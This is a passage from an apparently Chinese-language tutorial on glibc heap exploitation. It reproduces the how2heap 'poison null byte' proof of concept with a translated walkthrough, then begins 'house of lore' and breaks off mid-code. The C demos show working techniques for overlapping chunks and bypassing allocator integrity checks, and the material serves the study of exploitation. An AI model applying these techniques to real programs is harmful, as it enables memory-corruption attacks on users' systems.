&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;This&nbsp;technique&nbsp;can&nbsp;be&nbsp;used&nbsp;when&nbsp;you&nbsp;have&nbsp;an&nbsp;off-by-one&nbsp;into&nbsp;a&nbsp;malloc&#39;ed&nbsp;region&nbsp;with&nbsp;a&nbsp;null&nbsp;byte.\n&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;uint8_t*&nbsp;a;
&nbsp;&nbsp;&nbsp;&nbsp;uint8_t*&nbsp;b;
&nbsp;&nbsp;&nbsp;&nbsp;uint8_t*&nbsp;c;
&nbsp;&nbsp;&nbsp;&nbsp;uint8_t*&nbsp;b1;
&nbsp;&nbsp;&nbsp;&nbsp;uint8_t*&nbsp;b2;
&nbsp;&nbsp;&nbsp;&nbsp;uint8_t*&nbsp;d;

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;We&nbsp;allocate&nbsp;0x100&nbsp;bytes&nbsp;for&nbsp;&#39;a&#39;.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;a&nbsp;=&nbsp;(uint8_t*)&nbsp;malloc(0x100);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;a:&nbsp;%p\n&quot;,&nbsp;a);
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;real_a_size&nbsp;=&nbsp;malloc_usable_size(a);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Since&nbsp;we&nbsp;want&nbsp;to&nbsp;overflow&nbsp;&#39;a&#39;,&nbsp;we&nbsp;need&nbsp;to&nbsp;know&nbsp;the&nbsp;&#39;real&#39;&nbsp;size&nbsp;of&nbsp;&#39;a&#39;&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;(it&nbsp;may&nbsp;be&nbsp;more&nbsp;than&nbsp;0x100&nbsp;because&nbsp;of&nbsp;rounding):&nbsp;%#x\n&quot;,&nbsp;real_a_size);
&nbsp;&nbsp;&nbsp;&nbsp;/*&nbsp;chunk&nbsp;size&nbsp;attribute&nbsp;cannot&nbsp;have&nbsp;a&nbsp;least&nbsp;significant&nbsp;byte&nbsp;with&nbsp;a&nbsp;value&nbsp;of&nbsp;0x00.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;the&nbsp;least&nbsp;significant&nbsp;byte&nbsp;of&nbsp;this&nbsp;will&nbsp;be&nbsp;0x10,&nbsp;because&nbsp;the&nbsp;size&nbsp;of&nbsp;the&nbsp;chunk&nbsp;includes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*&nbsp;the&nbsp;amount&nbsp;requested&nbsp;plus&nbsp;some&nbsp;amount&nbsp;required&nbsp;for&nbsp;the&nbsp;metadata.&nbsp;*/
&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;=&nbsp;(uint8_t*)&nbsp;malloc(0x200);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;b:&nbsp;%p\n&quot;,&nbsp;b);

&nbsp;&nbsp;&nbsp;&nbsp;c&nbsp;=&nbsp;(uint8_t*)&nbsp;malloc(0x100);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;c:&nbsp;%p\n&quot;,&nbsp;c);

&nbsp;&nbsp;&nbsp;&nbsp;uint64_t*&nbsp;b_size_ptr&nbsp;=&nbsp;(uint64_t*)(b&nbsp;-&nbsp;8);

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;added&nbsp;fix&nbsp;for&nbsp;size==prev_size(next_chunk)&nbsp;check&nbsp;in&nbsp;newer&nbsp;versions&nbsp;of&nbsp;glibc
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;this&nbsp;added&nbsp;check&nbsp;requires&nbsp;we&nbsp;are&nbsp;allowed&nbsp;to&nbsp;have&nbsp;null&nbsp;pointers&nbsp;in&nbsp;b&nbsp;(not&nbsp;just&nbsp;a&nbsp;c&nbsp;string)
&nbsp;&nbsp;&nbsp;&nbsp;//*(size_t*)(b+0x1f0)&nbsp;=&nbsp;0x200;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;In&nbsp;newer&nbsp;versions&nbsp;of&nbsp;glibc&nbsp;we&nbsp;will&nbsp;need&nbsp;to&nbsp;have&nbsp;our&nbsp;updated&nbsp;size&nbsp;inside&nbsp;b&nbsp;itself&nbsp;to&nbsp;pass&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;the&nbsp;check&nbsp;&#39;chunksize(P)&nbsp;!=&nbsp;prev_size&nbsp;(next_chunk(P))&#39;\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;we&nbsp;set&nbsp;this&nbsp;location&nbsp;to&nbsp;0x200&nbsp;since&nbsp;0x200&nbsp;==&nbsp;(0x211&nbsp;&amp;&nbsp;0xff00)
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;which&nbsp;is&nbsp;the&nbsp;value&nbsp;of&nbsp;b.size&nbsp;after&nbsp;its&nbsp;first&nbsp;byte&nbsp;has&nbsp;been&nbsp;overwritten&nbsp;with&nbsp;a&nbsp;NULL&nbsp;byte
&nbsp;&nbsp;&nbsp;&nbsp;*(size_t*)(b+0x1f0)&nbsp;=&nbsp;0x200;

&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;this&nbsp;technique&nbsp;works&nbsp;by&nbsp;overwriting&nbsp;the&nbsp;size&nbsp;metadata&nbsp;of&nbsp;a&nbsp;free&nbsp;chunk
&nbsp;&nbsp;&nbsp;&nbsp;free(b);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;b.size:&nbsp;%#lx\n&quot;,&nbsp;*b_size_ptr);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;b.size&nbsp;is:&nbsp;(0x200&nbsp;+&nbsp;0x10)&nbsp;|&nbsp;prev_in_use\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;We&nbsp;overflow&nbsp;&#39;a&#39;&nbsp;with&nbsp;a&nbsp;single&nbsp;null&nbsp;byte&nbsp;into&nbsp;the&nbsp;metadata&nbsp;of&nbsp;&#39;b&#39;\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;a[real_a_size]&nbsp;=&nbsp;0;&nbsp;//&nbsp;&lt;---&nbsp;THIS&nbsp;IS&nbsp;THE&nbsp;&quot;EXPLOITED&nbsp;BUG&quot;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;b.size:&nbsp;%#lx\n&quot;,&nbsp;*b_size_ptr);

&nbsp;&nbsp;&nbsp;&nbsp;uint64_t*&nbsp;c_prev_size_ptr&nbsp;=&nbsp;((uint64_t*)c)-2;
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;c.prev_size&nbsp;is&nbsp;%#lx\n&quot;,*c_prev_size_ptr);
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;This&nbsp;malloc&nbsp;will&nbsp;result&nbsp;in&nbsp;a&nbsp;call&nbsp;to&nbsp;unlink&nbsp;on&nbsp;the&nbsp;chunk&nbsp;where&nbsp;b&nbsp;was.
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;The&nbsp;added&nbsp;check&nbsp;(commit&nbsp;id:&nbsp;17f487b),&nbsp;if&nbsp;not&nbsp;properly&nbsp;handled&nbsp;as&nbsp;we&nbsp;did&nbsp;before,
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;will&nbsp;detect&nbsp;the&nbsp;heap&nbsp;corruption&nbsp;now.
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;The&nbsp;check&nbsp;is&nbsp;this:&nbsp;chunksize(P)&nbsp;!=&nbsp;prev_size&nbsp;(next_chunk(P))&nbsp;where
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;P&nbsp;==&nbsp;b-0x10,&nbsp;chunksize(P)&nbsp;==&nbsp;*(b-0x10+0x8)&nbsp;==&nbsp;0x200&nbsp;(was&nbsp;0x210&nbsp;before&nbsp;the&nbsp;overflow)
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;next_chunk(P)&nbsp;==&nbsp;b-0x10+0x200&nbsp;==&nbsp;b+0x1f0
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;prev_size&nbsp;(next_chunk(P))&nbsp;==&nbsp;*(b+0x1f0)&nbsp;==&nbsp;0x200
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;We&nbsp;will&nbsp;pass&nbsp;the&nbsp;check&nbsp;since&nbsp;chunksize(P)&nbsp;==&nbsp;%#lx&nbsp;==&nbsp;%#lx&nbsp;==&nbsp;prev_size&nbsp;(next_chunk(P))\n&quot;,
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*((size_t*)(b-0x8)),&nbsp;*(size_t*)(b-0x10&nbsp;+&nbsp;*((size_t*)(b-0x8))));
&nbsp;&nbsp;&nbsp;&nbsp;b1&nbsp;=&nbsp;malloc(0x100);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;b1:&nbsp;%p\n&quot;,b1);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Now&nbsp;we&nbsp;malloc&nbsp;&#39;b1&#39;.&nbsp;It&nbsp;will&nbsp;be&nbsp;placed&nbsp;where&nbsp;&#39;b&#39;&nbsp;was.&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;At&nbsp;this&nbsp;point&nbsp;c.prev_size&nbsp;should&nbsp;have&nbsp;been&nbsp;updated,&nbsp;but&nbsp;it&nbsp;was&nbsp;not:&nbsp;%lx\n&quot;,*c_prev_size_ptr);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Interestingly,&nbsp;the&nbsp;updated&nbsp;value&nbsp;of&nbsp;c.prev_size&nbsp;has&nbsp;been&nbsp;written&nbsp;0x10&nbsp;bytes&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;before&nbsp;c.prev_size:&nbsp;%lx\n&quot;,*(((uint64_t*)c)-4));
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;We&nbsp;malloc&nbsp;&#39;b2&#39;,&nbsp;our&nbsp;&#39;victim&#39;&nbsp;chunk.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;Typically&nbsp;b2&nbsp;(the&nbsp;victim)&nbsp;will&nbsp;be&nbsp;a&nbsp;structure&nbsp;with&nbsp;valuable&nbsp;pointers&nbsp;that&nbsp;we&nbsp;want&nbsp;to&nbsp;control

&nbsp;&nbsp;&nbsp;&nbsp;b2&nbsp;=&nbsp;malloc(0x80);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;b2:&nbsp;%p\n&quot;,b2);

&nbsp;&nbsp;&nbsp;&nbsp;memset(b2,&#39;B&#39;,0x80);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Current&nbsp;b2&nbsp;content:\n%s\n&quot;,b2);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Now&nbsp;we&nbsp;free&nbsp;&#39;b1&#39;&nbsp;and&nbsp;&#39;c&#39;:&nbsp;this&nbsp;will&nbsp;consolidate&nbsp;the&nbsp;chunks&nbsp;&#39;b1&#39;&nbsp;and&nbsp;&#39;c&#39;&nbsp;(forgetting&nbsp;about&nbsp;&#39;b2&#39;).\n&quot;);

&nbsp;&nbsp;&nbsp;&nbsp;free(b1);
&nbsp;&nbsp;&nbsp;&nbsp;free(c);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Finally,&nbsp;we&nbsp;allocate&nbsp;&#39;d&#39;,&nbsp;overlapping&nbsp;&#39;b2&#39;.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;malloc(0x300);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;d:&nbsp;%p\n&quot;,d);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Now&nbsp;&#39;d&#39;&nbsp;and&nbsp;&#39;b2&#39;&nbsp;overlap.\n&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;memset(d,&#39;D&#39;,0x300);
&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;New&nbsp;b2&nbsp;content:\n%s\n&quot;,b2);

&nbsp;&nbsp;&nbsp;&nbsp;printf(&quot;Thanks&nbsp;to&nbsp;http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;for&nbsp;the&nbsp;clear&nbsp;explanation&nbsp;of&nbsp;this&nbsp;technique.\n&quot;);
}</pre><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">翻译：</span></strong></span><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个技术可被用于当可以被malloc的区域（也就是heap区域）存在一个单字节溢出漏洞的时候。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们先分配0x100个字节的内存，代号&#39;a&#39;。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">如果我们想要去溢出a的话，我们需要知道它的实际大小（因为空间复用的存在），在我的机器上是0x108。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">然后接着我们分配0x200个字节，代号&#39;b&#39;。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">再分配0x100个字节，代号&#39;c&#39;。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">uint8_t*&nbsp;a&nbsp;=&nbsp;malloc(0x100);
uint8_t*&nbsp;b&nbsp;=&nbsp;malloc(0x200);
uint8_t*&nbsp;c&nbsp;=&nbsp;malloc(0x100);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">那么我们现在就有三个内存块：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">a:&nbsp;0x100
b:&nbsp;0x200
c:&nbsp;0x100</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在新版glibc环境下，我们需要在b内部更新size来pass <strong>&#39;chunksize(P) != prev_size (next_chunk(P))&#39;</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">*(size_t*)(b+0x1f0)&nbsp;=&nbsp;0x200;
free(b)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">b.size: 0x211 == ((0x200 + 0x10) | pre_in_use)</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我们在a实现一个单字节的 null byte 溢出。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后 b.size = 0x200</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">此时c.presize = 0x210 但是没关系我们还是能pass掉前面那个check。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这个时候：</span></p><pre class="brush:cpp;toolbar:false">b1&nbsp;=&nbsp;malloc(0x100);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">返回给b1的地址就是前面free掉的b的地址。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">有趣的是现在C的presize在原来地址的后面两个单元位置处更新。 OK，我们再malloc一块内存。</span></p><pre class="brush:cpp;toolbar:false">b2&nbsp;=&nbsp;malloc(0x80);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">此时刚才的presize依然会更新，而且b2整个块也仍然在原来b的内部。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后我们将b1和c依次free。这会导致b1开始的位置一直到c的末尾中间的内存会合并成一块。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">free(b1);
free(c);
d&nbsp;=&nbsp;malloc(0x300);</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">返回的地址还是原来b的地址，重要的是刚才没有free的b2被包含在了里面！</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">我想这里的难点在于明白为什么后面的合并会发生。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">还记得，在我们第一次free(b)之前，进行了如下的设置：</span></p><pre class="brush:cpp;toolbar:false">*(size_t*)(b+0x1f0)&nbsp;=&nbsp;0x200;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">这一步非常关键，可以确保我们之后进行null byte溢出后，还能成功free(b)。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这和上一个例程house_of_spirit对fake_chunk_2进行的设置的道理是一样的，逃过<strong> &#39;chunksize(P) != prev_size (next_chunk(P))&#39;</strong> 的检查。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">之后分配b1和b2的时候，presize也会一直在(b+0x1f0)处更新。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而在最后free(c)的时候，检查的是c的presize位，而因为最开始的null byte溢出，导致这块区域的值一直没被更新，一直是b最开始的大小 0x210 。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">而在free的过程中就会认为前面0x210个字节都是空闲的，于是就错误地进行了合并，然而glibc忽略了中间还有个可怜的b2。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">更详细的讲解可以参考这篇paper</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><a href="http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf">http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</a>&nbsp;</span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">0x05 house_of_lore</span></strong></span></p><p style="text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">【注】：源码我改动过，使其编译为64位可执行文件仍能正常运行。其实不改的话也能正常运行，不过改了之后看得更直观。</span></p><p style="text-indent: 2em;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">源码</span></strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">/*
Advanced&nbsp;exploitation&nbsp;of&nbsp;the&nbsp;House&nbsp;of&nbsp;Lore&nbsp;-&nbsp;Malloc&nbsp;Maleficarum.
This&nbsp;PoC&nbsp;take&nbsp;care&nbsp;also&nbsp;of&nbsp;the&nbsp;glibc&nbsp;hardening&nbsp;of&nbsp;smallbin&nbsp;corruption.
[&nbsp;...&nbsp;]
else
{
&nbsp;&nbsp;bck&nbsp;=&nbsp;victim-&gt;bk;
&nbsp;&nbsp;if&nbsp;(__glibc_unlikely&nbsp;(bck-&gt;fd&nbsp;!=&nbsp;victim)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;errstr&nbsp;=&nbsp;&quot;malloc():&nbsp;smallbin&nbsp;double&nbsp;linked&nbsp;list&nbsp;corrupted&quot;;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;goto&nbsp;errout;
&nbsp;&nbsp;}
&nbsp;&nbsp;set_inuse_bit_at_offset&nbsp;(victim,&nbsp;nb);
&nbsp;&nbsp;bin-&gt;bk&nbsp;=&nbsp;bck;
&nbsp;&nbsp;bck-&gt;fd&nbsp;=&nbsp;bin;
&nbsp;&nbsp;[&nbsp;...&nbsp;]
*/</pre><p style="text-indent: 2em;"><br/><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;stdio.h&gt;
#include&nbsp;&lt;stdlib.h&gt;
#include&nbsp;&lt;string.h&gt;
#include&nbsp;&lt;stdint.h&gt;
void&nbsp;jackpot(){&nbsp;puts(&quot;Nice&nbsp;jump&nbsp;d00d&quot;);&nbsp;exit(0);&nbsp;}
int&nbsp;main(int&nbsp;argc,&nbsp;char&nbsp;*&nbsp;argv[]){
&nbsp;&nbsp;intptr_t*&nbsp;stack_buffer_1[4]&nbsp;=&nbsp;{0};
&nbsp;&nbsp;intptr_t*&nbsp;stack_buffer_2[3]&nbsp;=&nbsp;{0};
&nbsp;&nbsp;printf(&quot;\nWelcome&nbsp;to&nbsp;the&nbsp;House&nbsp;of&nbsp;Lore\n&quot;);
&nbsp;&nbsp;printf(&quot;This&nbsp;is&nbsp;a&nbsp;revisited&nbsp;version&nbsp;that&nbsp;bypass&nbsp;also&nbsp;the&nbsp;hardening&nbsp;check&nbsp;introduced&nbsp;by&nbsp;glibc&nbsp;malloc\n&quot;);
&nbsp;&nbsp;printf(&quot;This&nbsp;is&nbsp;tested&nbsp;against&nbsp;Ubuntu&nbsp;14.04.4&nbsp;-&nbsp;32bit&nbsp;-&nbsp;glibc-2.23\n\n&quot;);
&nbsp;&nbsp;printf(&quot;Allocating&nbsp;the&nbsp;victim&nbsp;chunk\n&quot;);
&nbsp;&nbsp;intptr_t&nbsp;*victim&nbsp;=&nbsp;malloc(0x80);
&nbsp;&nbsp;printf(&quot;Allocated&nbsp;the&nbsp;first&nbsp;small&nbsp;chunk&nbsp;on&nbsp;the&nbsp;heap&nbsp;at&nbsp;%p\n&quot;,&nbsp;victim);
&nbsp;&nbsp;//&nbsp;victim-WORD_SIZE&nbsp;because&nbsp;we&nbsp;need&nbsp;to&nbsp;remove&nbsp;the&nbsp;header&nbsp;size&nbsp;in&nbsp;order&nbsp;to&nbsp;have&nbsp;the&nbsp;absolute&nbsp;address&nbsp;of&nbsp;the&nbsp;chunk
&nbsp;&nbsp;intptr_t&nbsp;*victim_chunk&nbsp;=&nbsp;victim-2;
&nbsp;&nbsp;printf(&quot;stack_buffer_1&nbsp;at&nbsp;%p&nbsp;stack_buffer_1[1]&nbsp;at&nbsp;%p\n&quot;,&nbsp;(void*)stack_buffer_1,(void*)&amp;stack_buffer_1[1]);
&nbsp;&nbsp;printf(&quot;stack_buffer_2&nbsp;at&nbsp;%p&nbsp;stack_buffer_2[1]&nbsp;at&nbsp;%p\n&quot;,&nbsp;(void*)stack_buffer_2,(void*)&amp;stack_buffer_2[1]);
&nbsp;&nbsp;printf(&quot;Create&nbsp;a&nbsp;fake&nbsp;chunk&nbsp;on&nbsp;the&nbsp;stack\n&quot;);
&nbsp;&nbsp;printf(&quot;Set&nbsp;the&nbsp;fwd&nbsp;pointer&nbsp;to&nbsp;the&nbsp;victim_chunk&nbsp;in&nbsp;order&nbsp;to&nbsp;bypass&nbsp;the&nbsp;check&nbsp;of&nbsp;small&nbsp;bin&nbsp;corrupted&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;in&nbsp;second&nbsp;to&nbsp;the&nbsp;last&nbsp;malloc,&nbsp;which&nbsp;putting&nbsp;stack&nbsp;address&nbsp;on&nbsp;smallbin&nbsp;list\n&quot;);
&nbsp;&nbsp;stack_buffer_1[2]&nbsp;=&nbsp;victim_chunk;
&nbsp;&nbsp;printf(&quot;Set&nbsp;the&nbsp;bk&nbsp;pointer&nbsp;to&nbsp;stack_buffer_2&nbsp;and&nbsp;set&nbsp;the&nbsp;fwd&nbsp;pointer&nbsp;of&nbsp;stack_buffer_2&nbsp;to&nbsp;point&nbsp;to&nbsp;stack_buffer_1&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;in&nbsp;order&nbsp;to&nbsp;bypass&nbsp;the&nbsp;check&nbsp;of&nbsp;small&nbsp;bin&nbsp;corrupted&nbsp;in&nbsp;last&nbsp;malloc,&nbsp;which&nbsp;returning&nbsp;pointer&nbsp;to&nbsp;the&nbsp;fake&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;chunk&nbsp;on&nbsp;stack\n&quot;);
&nbsp;&nbsp;stack_buffer_1[3]&nbsp;=&nbsp;(intptr_t*)stack_buffer_2;
&nbsp;&nbsp;stack_buffer_2[2]&nbsp;=&nbsp;(intptr_t*)stack_buffer_1;

&nbsp;&nbsp;printf(&quot;Allocating&nbsp;another&nbsp;large&nbsp;chunk&nbsp;in&nbsp;order&nbsp;to&nbsp;avoid&nbsp;consolidating&nbsp;the&nbsp;top&nbsp;chunk&nbsp;with&nbsp;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&quot;the&nbsp;small&nbsp;one&nbsp;during&nbsp;the&nbsp;free()\n&quot;);
&nbsp;&nbsp;void&nbsp;*p5&nbsp;=&nbsp;malloc(1000);
&nbsp;&nbsp;printf(&quot;Allocated&nbsp;the&nbsp;large&nbsp;chunk&nbsp;on&nbsp;the&nbsp;heap&nbsp;at&nbsp;%p\n&quot;,&nbsp;p5);


&nbsp;&nbsp;printf(&quot;Freeing&nbsp;the&nbsp;chunk&nbsp;%p,&nbsp;it&nbsp;will&nbsp;be&nbsp;inserted&nbsp;in&nbsp;the&nbsp;unsorted&nbsp;bin\n&quot;,&nbsp;victim);
&nbsp;&nbsp;free((void*)victim);

&nbsp;&nbsp;printf(&quot;\nIn&nbsp;the&nbsp;unsorted&nbsp;bin&nbsp;the&nbsp;victim&#39;s&nbsp;fwd&nbsp;and&nbsp;bk&nbsp;pointers&nbsp;are&nbsp;nil\n&quot;);
&nbsp;&nbsp;printf(&quot;victim-&gt;fwd:&nbsp;%p\n&quot;,&nbsp;(void&nbsp;*)victim[0]);
&nbsp;&nbsp;printf(&quot;victim-&gt;bk:&nbsp;%p\n\n&quot;,&nbsp;(void&nbsp;*)victim[1]);

&nbsp;&nbsp;printf(&quot;Now&nbsp;performing&nbsp;a&nbsp;malloc&nbsp;that&nbsp;can&#39;t&nbsp;be&nbsp;handled&nbsp;by&nbsp;the&nbsp;UnsortedBin,&nbsp;nor&nbsp;the&nbsp;small&nbsp;bin\n&quot;);
&nbsp;&nbsp;printf(&quot;This&nbsp;means&nbsp;that&nbsp;the&nbsp;chunk&nbsp;%p&nbsp;will&nbsp;be&nbsp;inserted&nbsp;in&nbsp;front&nbsp;of&nbsp;the&nbsp;SmallBin\n&quot;,&nbsp;victim);

&nbsp;&nbsp;void&nbsp;*p2&nbsp;=&nbsp;malloc(1200);
&nbsp;&nbsp;printf(&quot;The&nbsp;chunk&nbsp;that&nbsp;can&#39;t&nbsp;be&nbsp;handled&nbsp;by&nbsp;the&nbsp;unsorted&nbsp;bin,&nbsp;nor&nbsp;the&nbsp;SmallBin&nbsp;has&nbsp;been&nbsp;allocated&nbsp;to&nbsp;%p\n&quot;,&nbsp;p2);

&nbsp;&nbsp;printf(&quot;The&nbsp;victim&nbsp;chunk&nbsp;has&nbsp;been&nbsp;sorted&nbsp;and&nbsp;its&nbsp;fwd&nbsp;and&nbsp;bk&nbsp;pointers&nbsp;updated\n&quot;);
&nbsp;&nbsp;printf(&quot;victim-&gt;fwd:&nbsp;%p\n&quot;,&nbsp;(void&nbsp;*)victim[0]);
&nbsp;&nbsp;printf(&quot;victim-&gt;bk:&nbsp;%p\n\n&quot;,&nbsp;(void&nbsp;*)victim[1]);
&nbsp;&nbsp;//------------VULNERABILITY-----------

&nbsp;&nbsp;printf(&quot;Now&nbsp;emulating&nbsp;a&nbsp;vulnerability&nbsp;that&nbsp;can&nbsp;overwrite&nbsp;the&nbsp;victim-&gt;bk&nbsp;pointer\n&quot;);

&nbsp;&nbsp;victim[1]&nbsp;=&nbsp;(intptr_t)stack_buffer_1;&nbsp;//&nbsp;victim-&gt;bk&nbsp;is&nbsp;pointing&nbsp;to&nbsp;stack

&nbsp;&nbsp;//------------------------------------

